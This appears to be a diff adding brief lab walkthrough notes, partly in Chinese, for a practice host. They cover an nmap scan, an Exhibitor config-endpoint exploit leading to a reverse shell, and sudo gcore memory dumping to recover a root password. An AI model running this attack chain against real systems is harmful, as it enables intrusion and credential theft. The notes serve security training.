@@ -1,0 +1,16 @@
+nmap -sV -sC -Pn 192.168.69.98 > nmap.txt
+
+
+
+curl -X POST -d @data.json http://192.168.69.98:8080/exhibitor/v1/config/set
+
+
+
+sudo /usr/bin/gcore -o test123.sh 10659
+
+1.nmap掃描出8080,8081端口
+2.8080端口試exhibitor服務,查找到exploit有48654.txt
+3.根據4864.txt取得reverse shell
+4.sudo -l 發現有gcore可以使用
+5.導出以下程序的執行memory找到root密碼
+/usr/bin/password-store
